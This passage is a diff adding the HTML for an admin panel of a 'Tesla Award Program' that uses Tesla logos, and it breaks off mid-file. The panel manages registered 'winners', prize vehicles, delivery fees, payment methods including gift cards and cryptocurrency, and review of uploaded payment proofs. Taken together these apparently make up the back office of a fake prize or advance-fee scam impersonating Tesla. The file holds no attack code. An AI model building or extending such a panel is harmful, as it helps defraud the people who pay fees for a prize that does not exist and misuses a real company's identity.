@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel — Tesla Award Program</title>
+  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
+  <link rel="icon" type="image/png" href="assets/tesla-logo.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="admin/css/admin.css?v=20260819k">
+  <link rel="stylesheet" href="admin/css/admin-payments.css?v=20260819k">
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="loginScreen">
+  <div class="login-container">
+    <div class="login-card">
+      <img src="assets/tesla-logo.png" alt="Tesla" class="login-logo" onerror="this.style.display='none'">
+      <h1>Administrator Access</h1>
+      <p class="subtitle">Restricted area. Enter your credentials to manage the Tesla Award Program.</p>
+      <div class="input-group">
+        <svg class="input-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        <input type="password" id="loginInput" placeholder="Enter admin password" onkeydown="if(event.key==='Enter')doLogin()" autofocus>
+      </div>
+      <button class="btn btn-primary btn-full" onclick="doLogin()" style="padding:15px;font-size:15px;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10,17 15,12 10,7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+        Authenticate
+      </button>
+      <p class="login-error" id="loginError">Incorrect password. Please try again.</p>
+      <div style="margin-top:24px;padding-top:20px;border-top:1px solid var(--border);font-size:11px;color:var(--admin-text-muted);">Authorized personnel only</div>
+    </div>
+  </div>
+</div>
+
+<!-- SIDEBAR OVERLAY -->
+<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar('close')"></div>
+
+<!-- APP -->
+<div id="app">
+  <aside class="sidebar" id="sidebar">
+    <!-- SIDEBAR HEADER -->
+    <div class="sidebar-header">
+      <div class="sb-brand">
+        <div class="sb-logo-mark">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+        </div>
+        <div class="sb-brand-info">
+          <span class="sb-brand-name">Tesla Award</span>
+          <span class="sb-brand-sub">Admin Panel</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- NAVIGATION -->
+    <div class="sb-nav-scroll">
+      <nav class="sb-nav">
+
+        <!-- Group: Overview -->
+        <div class="sb-group">
+          <div class="sb-group-label">Overview</div>
+          <button class="nav-item active" data-tab="dashboard" onclick="switchTab('dashboard')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg></span>
+            <span class="nav-label">Dashboard</span>
+          </button>
+          <button class="nav-item" data-tab="users" onclick="switchTab('users')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></span>
+            <span class="nav-label">Users</span>
+            <span class="nav-chip" id="usersNavBadge" style="display:none">0</span>
+          </button>
+          <button class="nav-item" data-tab="orders" onclick="switchTab('orders')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg></span>
+            <span class="nav-label">Orders</span>
+          </button>
+        </div>
+
+        <!-- Group: Commerce -->
+        <div class="sb-group">
+          <div class="sb-group-label">Commerce</div>
+          <button class="nav-item" data-tab="payments" onclick="switchTab('payments')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></span>
+            <span class="nav-label">Payment Methods</span>
+          </button>
+          <button class="nav-item" data-tab="proofs" onclick="switchTab('proofs')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><polyline points="9 15 11 17 15 13"/></svg></span>
+            <span class="nav-label">Payment Proofs</span>
+            <span class="nav-chip" id="proofsNavBadge" style="display:none">0</span>
+          </button>
+        </div>
+
+        <!-- Group: Configuration -->
+        <div class="sb-group">
+          <div class="sb-group-label">Configuration</div>
+          <button class="nav-item" data-tab="delivery" onclick="switchTab('delivery')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13" rx="1"/><path d="M16 8h4l3 5v3h-7V8z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg></span>
+            <span class="nav-label">Delivery Fees</span>
+          </button>
+        </div>
+
+        <!-- Group: System -->
+        <div class="sb-group">
+          <div class="sb-group-label">System</div>
+          <button class="nav-item" data-tab="notifications" onclick="switchTab('notifications')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></span>
+            <span class="nav-label">Notifications</span>
+          </button>
+          <button class="nav-item" data-tab="settings" onclick="switchTab('settings')">
+            <span class="nav-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></span>
+            <span class="nav-label">Settings</span>
+          </button>
+        </div>
+
+      </nav>
+    </div>
+
+    <!-- PROFILE FOOTER -->
+    <div class="sb-footer">
+      <div class="sb-profile-card">
+        <div class="sb-avatar">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        </div>
+        <div class="sb-profile-meta">
+          <span class="sb-profile-name">Administrator</span>
+          <span class="sb-profile-role">Super Admin</span>
+        </div>
+        <div class="sb-profile-actions">
+          <button class="sb-action-btn" onclick="window.open('index.html','_blank')" title="View Website">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+          </button>
+          <button class="sb-action-btn sb-logout-btn" onclick="doLogout()" title="Sign Out">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+  <div class="main-content">
+    <div class="topbar">
+      <div class="topbar-left">
+        <button class="sidebar-toggle" onclick="toggleSidebar()" aria-label="Toggle menu">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+        </button>
+        <div class="page-title-area">
+          <h2 id="pageTitle">Dashboard</h2>
+          <div class="breadcrumb" id="pageBreadcrumb">Admin / Dashboard</div>
+        </div>
+      </div>
+      <div class="topbar-right">
+        <div class="api-status-wrap" aria-live="polite">
+          <span class="status-dot online" id="apiDot"></span>
+          <span class="status-label" id="apiStatusLabel">Connected</span>
+        </div>
+        <button class="btn btn-ghost btn-sm" onclick="refreshAll()">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23,4 23,10 17,10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+          Refresh
+        </button>
+      </div>
+    </div>
+
+    <div class="page-content">
+
+      <!-- TAB: DASHBOARD -->
+      <div class="tab-panel active" id="panelDashboard">
+        <div class="stats-grid">
+          <div class="stat-card">
+            <span class="stat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></span>
+            <div class="stat-value" id="statTotal">—</div>
+            <div class="stat-label">Total Registered Users</div>
+          </div>
+          <div class="stat-card">
+            <span class="stat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22,4 12,14.01 9,11.01"/></svg></span>
+            <div class="stat-value" id="statVerified">—</div>
+            <div class="stat-label">Verified Users</div>
+          </div>
+          <div class="stat-card">
+            <span class="stat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12,6 12,12 16,14"/></svg></span>
+            <div class="stat-value" id="statPending">—</div>
+            <div class="stat-label">Pending Verification</div>
+          </div>
+          <div class="stat-card">
+            <span class="stat-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg></span>
+            <div class="stat-value" id="statOrders">—</div>
+            <div class="stat-label">Total Orders</div>
+          </div>
+        </div>
+
+        <div class="dash-grid">
+          <div class="dash-card">
+            <div class="dash-card-header">
+              <h3><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22,12 18,12 15,21 9,3 6,12 2,12"/></svg> Registration Activity (7 Days)</h3>
+            </div>
+            <div class="dash-card-body">
+              <div class="activity-chart" id="activityChart"></div>
+              <div class="chart-labels" id="chartLabels"></div>
+            </div>
+          </div>
+          <div class="dash-card">
+            <div class="dash-card-header">
+              <h3>Recent Registrations</h3>
+              <button class="btn btn-ghost btn-sm" onclick="switchTab('users')">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12,5 19,12 12,19"/></svg>
+                View All
+              </button>
+            </div>
+            <div class="dash-card-body" style="padding:0;">
+              <div class="table-wrap">
+                <table><thead><tr><th>User</th><th>Email</th><th>Status</th><th>Date</th></tr></thead><tbody id="recentTable"><tr><td colspan="4" style="text-align:center;padding:24px;color:var(--admin-text-muted);">Loading...</td></tr></tbody></table>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB: USERS -->
+      <div class="tab-panel" id="panelUsers">
+        <div class="admin-card">
+          <div class="card-header">
+            <h3><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg> All Registered Users</h3>
+            <p class="payment-proofs-subtitle">Review submitted payment evidence before approving an order.</p>
+            <div class="payment-proofs-toolbar" role="search">
+              <div class="payment-proofs-search search-box">
+                <span class="search-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span>
+                <input type="text" id="userSearch" placeholder="Search users..." oninput="renderUsers()">
+              </div>
+              <select class="filter-select" id="statusFilter" onchange="renderUsers()">
+                <option value="all">All Status</option>
+                <option value="verified">Verified</option>
+                <option value="pending">Pending</option>
+              </select>
+              <button class="btn btn-ghost btn-sm" onclick="refreshAll()">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23,4 23,10 17,10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                Refresh
+              </button>
+            </div>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>#</th><th>User</th><th>Email</th><th>Phone</th><th>Status</th><th>Verified</th><th>Registered</th><th>Actions</th></tr></thead>
+              <tbody id="usersTable"><tr><td colspan="8" style="text-align:center;padding:32px;color:var(--admin-text-muted);">Loading...</td></tr></tbody>
+            </table>
+          </div>
+          <div class="empty-state" id="usersEmpty" style="display:none;">
+            <div class="empty-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg></div>
+            <p>No users match your search criteria.</p>
+          </div>
+          <div class="table-footer" id="usersCount"></div>
+        </div>
+      </div>
+
+      <!-- TAB: ORDERS — Redesigned -->
+      <div class="tab-panel" id="panelOrders">
+        <div class="admin-card">
+          <div class="card-header">
+            <h3><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg> All Orders</h3>
+            <div class="card-actions">
+              <div class="search-box">
+                <span class="search-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span>
+                <input type="text" id="orderSearch" placeholder="Search orders, customers…" oninput="ordersSearch(this.value)">
+              </div>
+              <select class="filter-select" id="orderStatusFilter" onchange="ordersFilter(this.value)">
+                <option value="all">All Statuses</option>
+                <option value="confirmed">Order Confirmed</option>
+                <option value="processing">Processing</option>
+                <option value="shipped">Shipped</option>
+                <option value="in_transit">In Transit</option>
+                <option value="out_for_delivery">Out for Delivery</option>
+                <option value="delivered">Delivered</option>
+              </select>
+              <button class="btn btn-ghost btn-sm" onclick="loadOrders()">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23,4 23,10 17,10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                Refresh
+              </button>
+            </div>
+          </div>
+          <div style="padding:6px 20px 8px;font-size:12px;color:var(--admin-text-muted);" id="ordersCount"></div>
+          <div id="ordersContainer" style="padding:0 20px 20px;"></div>
+          <div class="empty-state" id="ordersEmpty" style="display:none;">
+            <div class="empty-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg></div>
+            <p>No orders have been placed yet.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB: VEHICLES -->
+      <div class="tab-panel" id="panelVehicles">
+        <div class="admin-card">
+          <div class="card-header">
+            <h3><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 17a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v1a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1v-1Z"/><path d="M5 17V9a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v8"/><path d="M9 3h6l4 4"/><circle cx="8" cy="18" r="1"/><circle cx="16" cy="18" r="1"/></svg> Tesla Vehicle Fleet</h3>
+            <span class="header-supporting-text">Prize selection for verified winners</span>
+          </div>
+          <div style="padding:20px;">
+            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;" id="vehiclesGrid"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB: PAYMENT METHODS (ENTERPRISE) -->
+      <div class="tab-panel pm-payment-panel" id="panelPayments">
+        <div class="admin-card pm-payment-card">
+          <div class="card-header pm-payment-header">
+            <h3><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/><path d="M7 15h4"/><path d="M15 15h2"/></svg> Payment Methods</h3>
+            <div class="card-actions pm-payment-actions">
+              <button class="btn btn-primary btn-sm" onclick="showAddPaymentMethod()">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+                Add Method
+              </button>
+              <button class="btn btn-ghost btn-sm" onclick="loadPaymentMethods()" title="Refresh">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23,4 23,10 17,10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+              </button>
+            </div>
+          </div>
+          <div class="pm-payment-content" style="padding:20px;">
+            <!-- Summary stat tiles -->
+            <div class="pm-stat-row pm-stat-row--premium">
+              <div class="pm-stat"><div class="pm-stat-value" id="pmTotalCount">0</div><div class="pm-stat-label">Total Methods</div></div>
+              <div class="pm-stat"><div class="pm-stat-value" id="pmEnabledCount" style="color:var(--success);">0</div><div class="pm-stat-label">Active</div></div>
+              <div class="pm-stat"><div class="pm-stat-value" id="pmDisabledCount" style="color:var(--admin-text-muted);">0</div><div class="pm-stat-label">Inactive</div></div>
+              <div class="pm-stat"><div class="pm-stat-value" id="pmCryptoCount">0</div><div class="pm-stat-label">Crypto</div></div>
+            </div>
+
+            <!-- Toolbar: search / filter / sort -->
+            <div class="pm-toolbar pm-toolbar--premium">
+              <div class="search-box">
+                <span class="search-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span>
+                <input type="text" id="pmSearch" placeholder="Search payment methods..." oninput="renderPaymentMethods()">
+              </div>
+              <select class="filter-select" id="pmTypeFilter" onchange="renderPaymentMethods()">
+                <option value="all">All Types</option>
+                <option value="wallet">Wallet / App</option>
+                <option value="bank">Bank</option>
+                <option value="crypto">Cryptocurrency</option>
+                <option value="card">Card</option>
+                <option value="gift">Gift Card</option>
+              </select>
+              <select class="filter-select" id="pmStatusFilter" onchange="renderPaymentMethods()">
+                <option value="all">All Status</option>
+                <option value="active">Active</option>
+                <option value="inactive">Inactive</option>
+              </select>
+              <select class="filter-select" id="pmSort" onchange="renderPaymentMethods()">
+                <option value="order">Sort: Display Order</option>
+                <option value="name">Sort: Name (A–Z)</option>
+                <option value="updated">Sort: Recently Updated</option>
+                <option value="status">Sort: Status</option>
+              </select>
+            </div>
+
+            <div class="pm2-grid pm3-grid" id="paymentMethodsGrid">
+              <div style="text-align:center;padding:40px;color:var(--admin-text-muted);grid-column:1/-1;">Loading payment methods...</div>
+            </div>
+            <div class="empty-state pm-empty-flex" id="pmEmpty" style="display:none;">
+              <div class="empty-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>
+              <p>No payment methods match your filters.</p>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /panelPayments -->
+
+      <!-- TAB: PAYMENT PROOFS -->
+      <div class="tab-panel payment-proofs-panel" id="panelProofs">
+        <div class="admin-card payment-proofs-shell">
+          <div class="card-header payment-proofs-header">
+            <h3 class="payment-proofs-title">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14,2 14,8 20,8"/><path d="M9 15l2 2 4-4"/></svg>
+              Payment Proofs
+              <span id="proofsCountLabel" class="payment-proofs-count"></span>
+            </h3>
+            <div class="card-actions">
+              <div class="search-box">
+                <span class="search-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span>
+                <input type="text" id="proofSearch" placeholder="Search name, email, order ID..." aria-label="Search payment proofs" oninput="renderProofs()">
+              </div>
+              <label class="sr-only" for="proofFilter">Filter payment proofs by status</label>
+              <select class="filter-select payment-proofs-select" id="proofFilter" aria-label="Filter by status" onchange="renderProofs()">
+                <option value="all">All statuses</option>
+                <option value="pending">Pending</option>
+                <option value="approved">Approved</option>
+                <option value="rejected">Rejected</option>
+              </select>
+              <label class="sr-only" for="proofSort">Sort payment proofs</label>
+              <select class="filter-select payment-proofs-select" id="proofSort" aria-label="Sort payment proofs" onchange="renderProofs()">
+                <option value="newest">Newest first</option>
+                <option value="oldest">Oldest first</option>
+                <option value="pending_first">Pending first</option>
+              </select>
+              <button class="btn btn-ghost btn-sm payment-proofs-refresh" onclick="loadProofs()" title="Refresh payment proofs" aria-label="Refresh payment proofs">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23,4 23,10 17,10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+              </button>
+            </div>
+          </div>
+          <div id="proofsContainer" class="payment-proofs-container"></div>
+          <div class="empty-state payment-proofs-empty" id="proofsEmpty" style="display:none;">
+            <div class="empty-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14,2 14,8 20,8"/><path d="M9 15l2 2 4-4"/></svg></div>
+            <strong>No payment proofs found</strong>
+            <p>Submitted proofs will appear here for review.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Payment Proof Detail Modal -->
+      <div id="proofDetailModal" class="proof-detail-modal" style="display:none;position:fixed;inset:0;z-index:9000;" onclick="if(event.target===this)window.closeProofDetail()">
+        <div class="proof-detail-dialog" onclick="event.stopPropagation()">
+          <!-- Sticky modal header -->
+          <div class="proof-detail-header">
+            <div class="proof-detail-title">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="2.5"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14,2 14,8 20,8"/><path d="M9 15l2 2 4-4"/></svg>
+              <span>Payment proof details</span>
+            </div>
+            <button type="button" class="proof-detail-close" onclick="window.closeProofDetail()" aria-label="Close payment proof details">
+              <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="m6 6 12 12M18 6 6 18"/></svg>
+            </button>
+          </div>
+          <div id="proofDetailBody" class="proof-detail-body" class="proof-detail-body"></div>
+        </div>
+      </div>
+
+      <!-- Full-size image lightbox with prev/next navigation -->
+      <div id="imageZoomOverlay" class="proof-image-lightbox" style="display:none;position:fixed;inset:0;z-index:9999;" onclick="if(event.target===this||event.target.id==='imageZoomOverlay')window.closeImageZoom()">
+        <!-- Close -->
+        <button type="button" class="proof-lightbox-close" onclick="window.closeImageZoom()" aria-label="Close proof image preview">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="m6 6 12 12M18 6 6 18"/></svg>
+        </button>
+        <!-- Counter -->
+        <div id="imageZoomCounter" class="proof-lightbox-counter"></div>
+        <!-- Prev -->
+        <button type="button" id="imageZoomPrev" class="proof-lightbox-nav proof-lightbox-nav--prev" onclick="event.stopPropagation();window.zoomPrev()" aria-label="Previous proof image">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9"><path d="m15 18-6-6 6-6"/></svg>
+        </button>
+        <!-- Image -->
+        <img id="imageZoomImg" class="proof-lightbox-image" src="" alt="Payment proof">
+        <!-- Next -->
+        <button type="button" id="imageZoomNext" class="proof-lightbox-nav proof-lightbox-nav--next" onclick="event.stopPropagation();window.zoomNext()" aria-label="Next proof image">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9"><path d="m9 18 6-6-6-6"/></svg>
+        </button>
+      </div>
+
+      <!-- TAB: SUPPORT & SOCIAL -->
+      <div class="tab-panel" id="panelSocial">
+        <div class="admin-card" style="padding:0;overflow:visible;">
+          <div class="card-header">
+            <h3><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg> Support & Social Media</h3>
+            <span class="header-supporting-text">Configure contact channels shown on the public website</span>
+          </div>
+          <div style="padding:20px;">
+            <div class="social-card">
+              <div class="social-icon-wrap whatsapp">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#25D366" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+              </div>
+              <div class="social-info">
+                <div class="title">WhatsApp</div>
+                <div class="desc">WhatsApp contact number shown on the website</div>
+              </div>
+              <div class="social-actions">
+                <label class="toggle-switch"><input type="checkbox" id="whatsappEnabled" onchange="saveSocialSettings()"><span class="toggle-slider"></span></label>
+              </div>
+            </div>
+            <div style="margin-bottom:16px;display:flex;gap:12px;flex-wrap:wrap;">
+              <div style="flex:1;min-width:200px;">
+                <label class="form-label" for="whatsappNumber">WhatsApp Number</label>
+                <input class="form-input" id="whatsappNumber" placeholder="+1234567890" onchange="saveSocialSettings()">
+              </div>
+              <div style="flex:1;min-width:200px;">
